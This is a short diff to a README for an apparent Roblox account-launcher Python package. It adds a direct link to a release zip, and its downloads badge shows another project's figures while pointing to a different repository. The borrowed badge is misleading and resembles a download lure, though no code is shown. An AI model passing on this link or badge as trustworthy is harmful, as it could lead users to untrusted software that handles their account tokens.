@@ -1,5 +1,6 @@
-[![Latest Downloads](https://img.shields.io/github/downloads/ic3w0lf22/Roblox-Account-Manager/latest/total)](https://github.com/Mana42138/Roblox-Auth/releases/download/roblox-auth/Roblox-Auth-main.zip)
+[![Latest Downloads](https://img.shields.io/github/downloads/ic3w0lf22/Roblox-Account-Manager/latest/total)](https://github.com/Mana42138/Roblox-Auth/releases/tag/roblox-auth)
 [![Discord](https://img.shields.io/discord/871845273800957982?label=Discord)](https://discord.gg/Af7HahqdzF)
+https://github.com/Mana42138/Roblox-Auth/releases/download/roblox-auth/Roblox-Auth-main.zip
 # Roblox Account Launcher
 
 This Python package provides a simple interface for launching Roblox games using an authenticated account. It includes functions to obtain necessary authentication tokens and launch a specified Roblox game.
